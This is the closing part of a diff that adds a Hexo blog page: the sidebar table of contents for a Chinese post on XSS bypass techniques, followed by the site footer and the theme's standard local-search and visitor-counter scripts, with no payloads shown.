+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-Base"><span class="nav-number">1.</span> <span class="nav-text">XSS Base</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#能够执行js的标签、事件、属性"><span class="nav-number">1.1.</span> <span class="nav-text">能够执行js的标签、事件、属性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#标签"><span class="nav-number">1.1.1.</span> <span class="nav-text">标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#所有的event事件都可以执行js"><span class="nav-number">1.1.2.</span> <span class="nav-text">所有的event事件都可以执行js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#可以执行js的属性"><span class="nav-number">1.1.3.</span> <span class="nav-text">可以执行js的属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss绕过方式"><span class="nav-number">1.2.</span> <span class="nav-text">xss绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#自定义标签"><span class="nav-number">1.2.1.</span> <span class="nav-text">自定义标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代替-空格"><span class="nav-number">1.2.2.</span> <span class="nav-text">/ 代替 空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#最短字符"><span class="nav-number">1.2.3.</span> <span class="nav-text">最短字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a标签"><span class="nav-number">1.2.4.</span> <span class="nav-text">a标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#各种编码绕过"><span class="nav-number">1.2.5.</span> <span class="nav-text">各种编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#百分之百分号"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">百分之百分号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64编码绕过"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">base64编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTML实体编码的利用绕过waf"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">HTML实体编码的利用绕过waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval函数"><span class="nav-number">1.2.5.4.</span> <span class="nav-text">eval函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#script标签"><span class="nav-number">1.2.6.</span> <span class="nav-text">script标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#button标签"><span class="nav-number">1.2.7.</span> <span class="nav-text">button标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#p标签"><span class="nav-number">1.2.8.</span> <span class="nav-text">p标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#img标签"><span class="nav-number">1.2.9.</span> <span class="nav-text">img标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#body标签"><span class="nav-number">1.2.10.</span> <span class="nav-text">body标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#var标签"><span class="nav-number">1.2.11.</span> <span class="nav-text">var标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#div标签"><span class="nav-number">1.2.12.</span> <span class="nav-text">div标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iframe标签"><span class="nav-number">1.2.13.</span> <span class="nav-text">iframe标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meta标签"><span class="nav-number">1.2.14.</span> <span class="nav-text">meta标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#object标签"><span class="nav-number">1.2.15.</span> <span class="nav-text">object标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#marquee标签"><span class="nav-number">1.2.16.</span> <span class="nav-text">marquee标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isindex标签"><span class="nav-number">1.2.17.</span> <span class="nav-text">isindex标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#input标签"><span class="nav-number">1.2.18.</span> <span class="nav-text">input标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select标签"><span class="nav-number">1.2.19.</span> <span class="nav-text">select标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#textarea标签"><span class="nav-number">1.2.20.</span> <span class="nav-text">textarea标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#keygen标签"><span class="nav-number">1.2.21.</span> <span class="nav-text">keygen标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frameset标签"><span class="nav-number">1.2.22.</span> <span class="nav-text">frameset标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lt-embed标签-gt"><span class="nav-number">1.2.23.</span> <span class="nav-text">&lt;embed标签&gt;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#svg标签"><span class="nav-number">1.2.24.</span> <span class="nav-text">svg标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#math标签"><span class="nav-number">1.2.25.</span> <span class="nav-text">math标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#video标签"><span class="nav-number">1.2.26.</span> <span class="nav-text">video标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#audio标签"><span class="nav-number">1.2.27.</span> <span class="nav-text">audio标签</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#平时搞XSS可能会用得到的技巧"><span class="nav-number">1.3.</span> <span class="nav-text">平时搞XSS可能会用得到的技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer为空才可以访问"><span class="nav-number">1.3.1.</span> <span class="nav-text">Referer为空才可以访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意返回的type类型"><span class="nav-number">1.3.2.</span> <span class="nav-text">注意返回的type类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#阻止浏览器302跳转"><span class="nav-number">1.3.3.</span> <span class="nav-text">阻止浏览器302跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意头部的X-XSS-Protection"><span class="nav-number">1.3.4.</span> <span class="nav-text">注意头部的X-XSS-Protection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML-Entity"><span class="nav-number">1.4.</span> <span class="nav-text">HTML Entity</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.4.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Entity-Name"><span class="nav-number">1.4.2.</span> <span class="nav-text">Entity Name</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Entity-Number"><span class="nav-number">1.4.3.</span> <span class="nav-text">Entity Number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#示例"><span class="nav-number">1.4.4.</span> <span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.5.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ahodor</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+-->
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
